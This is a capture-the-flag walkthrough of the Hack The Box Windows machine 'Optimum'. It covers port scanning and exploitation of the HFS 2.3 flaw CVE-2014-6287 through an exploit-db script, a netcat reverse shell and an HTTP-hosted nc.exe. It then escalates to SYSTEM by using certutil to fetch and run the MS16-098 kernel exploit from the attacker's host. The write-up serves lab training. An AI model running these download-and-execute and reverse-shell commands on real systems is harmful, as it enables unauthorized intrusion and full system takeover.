# Optimum 

**OS:** Windows

**Level:** Easy

**Links:** [1](https://www.hackthebox.com/machines/Optimum)  [2](https://app.hackthebox.com/machines/Optimum)

**Machine ip:** 10.10.10.8

![Optimum](https://github.com/h4md153v63n/CTFs/assets/5091265/f0fe7004-231f-495f-b3b2-8af6d4e6d81a)


## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.8 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.8 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6bd17850-1383-4bb9-9363-f840a535bbc5)


## Enumeration
![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7b8a57ae-f7cc-4fee-a4bb-d9d8ae1f2ddb)


## Exploitation & Gaining Access

### Method 1: CVE-2014-6287 [1](https://www.exploit-db.com/exploits/39161) [2](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/optimum-writeup-w-o-metasploit#id-4a01)

```
searchsploit hfs 2.3

searchsploit -m 39161
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/160c6e02-5cc4-4c84-aa44-b51481749738)

Change ip addres and port number:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fbbb8068-00c8-4bda-8ae5-9b062ae8d92a)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a62cd8b5-3931-4863-9e43-c9bd8ca44602)

```
# On the kali attack vm:
cp /usr/share/windows-binaries/nc.exe .

# On the kali attack vm - different terminal:
sudo python3 -m http.server 80

# On the kali attack vm - different terminal you will get the revershell:
nc -nlvp 4444

# On the kali attack vm - different terminal:
python3 39161.py 10.10.10.8 80

python3 39161.py 10.10.10.8 80

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/297d6042-a32c-4afc-87ac-a4502acc2fc2)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0b3ad525-c717-4f8c-a61c-6bf6381ab8f2)


### Method 2: CVE-2014-6287 [1](https://www.exploit-db.com/exploits/34668)
Review the alternative solutions [1](https://benheater.com/hackthebox-optimum/#manual-exploit) [2](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html#shell) [3](https://pencer.io/ctf/ctf-htb-optimum/#initial-shell)

**Alternatively**, try powershell shell as **Invoke-PowerShellTcpOneLine.ps1** [1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1) [2](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html#shell)


### Method 3: CVE-2014-6287 [1](https://www.exploit-db.com/exploits/49584)
Review the alternative solution [1](https://www.dotnetrussell.com/index.php/2021/08/20/hackthebox-optimum-walkthrough/)


### Method 4: CVE-2014-6287 [1](https://www.exploit-db.com/exploits/49125)
Review the alternative solution [1](https://systemweakness.com/oscp-preparation-hack-the-box-8-optimum-2c8da9435596)


### Method 5: Metasploit Solution [1](https://www.exploit-db.com/exploits/34926)
+ Review the alternative solution [1](https://ethicalhacs.com/optimum-hackthebox-walkthrough/) [2](https://medium.com/@joemcfarland/hack-the-box-optimum-writeup-36ccdffbeacd) [3](https://www.siberportal.org/red-team/penetration-testing/hack-the-box-optimum-cozumu/)


## Privilege Escalation

### Method 1: MS16-098 / Kernel [1](https://www.exploit-db.com/exploits/41020) [2](https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe) [3](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/optimum-writeup-w-o-metasploit#id-4f80) [4](https://benheater.com/hackthebox-optimum/#windows-exploit-suggester)

**Alternative** links [1](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098) [2](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.exe)

```
# On the kali attack vm:
python2 windows-exploit-suggester.py --update

python2 windows-exploit-suggester.py --database 2024-04-08-mssb.xls --systeminfo systeminfo.txt

# On the target machine:
systeminfo
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/32eb7f0c-5bb7-41b6-8d33-dfb5f11445a1)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a43d3006-c5f2-4141-9446-154e5c8169ea)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c48e9398-e5c2-4853-9bd8-1b9d0596b083)

```
# On the kali attack vm:
searchsploit 41020

searchsploit -m 41020

wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe

sudo python3 -m http.server

# On the target machine:
certutil.exe -urlcache -split -f "http://10.10.14.24:8000/41020.exe" 41020.exe

41020.exe
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d51b7047-a7a0-4610-90a0-f28a43dbaa68)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5cbb257e-323c-4c60-9ba7-7cd637287e51)

Get the shell as **nt authority\system**, and read the root flag.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4616bddf-9e5c-47fc-ad79-1f42c84449c8)


## Method 2: [CVE-2016-0099 / MS16-032](https://www.exploit-db.com/exploits/39719/)
+ Review the alternative solutions [1](https://benheater.com/hackthebox-optimum/#kali) [2](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html#ms16-032) 
+ Metasploit solutions [1](https://ethicalhacs.com/optimum-hackthebox-walkthrough/) [2](https://cybertoucan.gitbook.io/htb/windows/optimum#type-1-root-access-w-metasploit) [3](https://medium.com/@joemcfarland/hack-the-box-optimum-writeup-36ccdffbeacd)


## Method 3: CVE-2016-7214 / MS16-135 [1](https://nvd.nist.gov/vuln/detail/CVE-2016-7214) [2](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135)
+ Review the alternative solutions [1](https://cybertoucan.gitbook.io/htb/windows/optimum#privilege-escalation-1)


# References & Alternatives
+ https://vvmlist.github.io/#Optimum
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/optimum-writeup-w-o-metasploit
  + https://medium.com/@toneemarqus/optimum-htb-manual-walkthrough-2023-tonee-e2a53fb59b1d
+ https://0xdf.gitlab.io/2021/03/17/htb-optimum.html
  + https://benheater.com/hackthebox-optimum
+ https://pencer.io/ctf/ctf-htb-optimum
+ https://ivanitlearning.wordpress.com/2020/08/01/hackthebox-optimum/
+ https://systemweakness.com/oscp-preparation-hack-the-box-8-optimum-2c8da9435596
+ https://cybertoucan.gitbook.io/htb/windows/optimum
+ https://www.hackingarticles.in/hack-the-box-challenge-optimum-walkthrough/
+ https://ethicalhacs.com/optimum-hackthebox-walkthrough/
  + https://github.com/Bengman/CTF-writeups/blob/master/Hackthebox/optimum.md
  + https://medium.com/@joemcfarland/hack-the-box-optimum-writeup-36ccdffbeacd
  + https://www.siberportal.org/red-team/penetration-testing/hack-the-box-optimum-cozumu/


## CVE Scripting
+ **CVE-2014-6287:**
  + https://www.exploit-db.com/exploits/39161
    + https://www.exploit-db.com/exploits/34926
  + https://www.exploit-db.com/exploits/34668
  + https://www.exploit-db.com/exploits/49584
  + https://www.exploit-db.com/exploits/49125
  + https://nvd.nist.gov/vuln/detail/CVE-2014-6287
+ **MS16-098 / Kernel:**
  + https://www.exploit-db.com/exploits/41020
    + https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41020.exe
  + https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-098
    + https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.exe
+ **CVE-2016-0099 / MS16-032:**
  + https://www.exploit-db.com/exploits/39719/
  + https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1
+ **CVE-2016-7214 / MS16-135:** 
  + https://nvd.nist.gov/vuln/detail/CVE-2016-7214
  + https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135


## Tools
+ /usr/share/windows-resources/binaries/
+ **Invoke-PowerShellTcpOneLine.ps1:** https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1
+ **Windows Exploit Suggester:** https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+ **winPEAS:** https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+ **Watson:** https://github.com/rasta-mouse/Watson
  + **Sherlock:** https://github.com/rasta-mouse/Sherlock
  + https://0xdf.gitlab.io/2018/10/27/htb-bounty.html#enumeration


## Technical Knowledge
+ -


## Problems Solution
+ **SyntaxError: (unicode error) 'unicodeescape' codec can't decode bytes in position 2-3: truncated \UXXXXXXXX escape:**
  + https://youtu.be/rNmF991BSTE?t=40
  + https://www.geeksforgeeks.org/how-to-fix-syntaxerror-unicode-error-unicodeescape-codec-cant-decode-bytes/
  + https://community.alteryx.com/t5/Alteryx-Designer-Desktop-Discussions/Error-unicodeescape-codec-can-t-decode-bytes/td-p/427540
+ **SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?:**
  + https://www.w3docs.com/snippets/python/what-does-syntaxerror-missing-parentheses-in-call-to-print-mean-in-python.html
  + https://stackoverflow.com/questions/25445439/what-does-syntaxerror-missing-parentheses-in-call-to-print-mean-in-python
+ **ModuleNotFoundError: No module named 'urllib2':**
  + https://www.easytweaks.com/module-not-found-urllib2/
  + https://youtu.be/jfD_9DoWGlI?t=63
  + https://blog.finxter.com/fix-import-error-no-module-named-urllib2-python/
+ **ERROR: Could not find a version that satisfies the requirement urllib (from versions: none):**
  + https://github.com/ThomasTJdev/python_gdork_sqli/issues/1
+ **xlrd.biffh.XLRDError: Excel xlsx file; not supported:**
  + https://stackoverflow.com/questions/65254535/xlrd-biffh-xlrderror-excel-xlsx-file-not-supported
  + https://benheater.com/hackthebox-optimum/#install-required-python-module


## For More
- **How-to: Detecting 64 bit vs 32 bit:** https://ss64.com/nt/syntax-64bit.html
